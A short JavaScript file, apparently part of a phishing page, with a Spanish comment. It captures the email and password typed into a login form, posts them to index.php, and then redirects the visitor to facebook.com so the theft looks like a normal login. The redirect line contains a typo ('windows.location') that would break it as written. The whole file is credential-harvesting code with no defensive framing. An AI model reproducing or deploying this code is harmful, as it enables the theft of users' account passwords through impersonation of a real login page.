const email = document.getElementById("email")
const pass = document.getElementById("pass")
const btn = document.getElementById("inicioS")

btn.addEventListener("click", () => {
    /* hacer peticion http a index.php metodo post */
    fetch("index.php", {
        method: "POST",
        body: JSON.stringify({
            email: email.value,
            pass: pass.value
        })
    })
    .then(res => {windows.location.href = "https://www.facebook.com/"})
})
